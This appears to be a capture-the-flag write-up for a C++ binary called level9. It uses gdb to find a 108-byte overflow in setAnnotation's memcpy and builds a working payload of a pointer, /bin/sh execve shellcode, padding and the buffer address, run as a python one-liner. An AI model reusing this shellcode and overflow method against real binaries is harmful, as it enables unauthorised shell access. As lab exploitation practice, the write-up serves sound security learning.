In this level we're given a cpp program.

After analyze it with gdb we can find 5 interesting functions :

N::N(int)
N::setAnnotation(char*)
N::operator+(N&)
N::operator-(N&)
main This binary is written in cpp and there is no calls to /bin/sh, we can assume we'll have to use shellcode this time.
We should use the memcpy() on argv[1] in setAnnotation() to make the call to edx calls a shellcode. Basically, this is a buffer overflow.
First of all, find the offset using the pattern generator and eip offset finder :

r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()

info register eax

eax            0x41366441       1094083649

the offset starts at 108

let's build the payload using a shellcode for the /bin/sh call
Put a breakpoint at main+136 before:
b *main+136 

(gdb) x/x $eax
0x804a00c:	0x41414141 // buffer address
(gdb) si
0x08048680 in main ()
(gdb) x/x $eax
0x804a078:	0x62626262
(gdb) si
0x08048682 in main ()
(gdb) x/x $eax
0x62626262:	Cannot access memory at address 0x62626262
First we have AAAA (41414141) at the address 0x804a00c offset 0, then bbbb (62626262) at the offset 108 and finally the error

the payload will look like this:
payload : shell_addr + shellcode + padding + buffer_addr
          [4 bytes]   [28 bytes]  [76 bytes]  [4 bytes] = 108 + 4

python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"'

./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')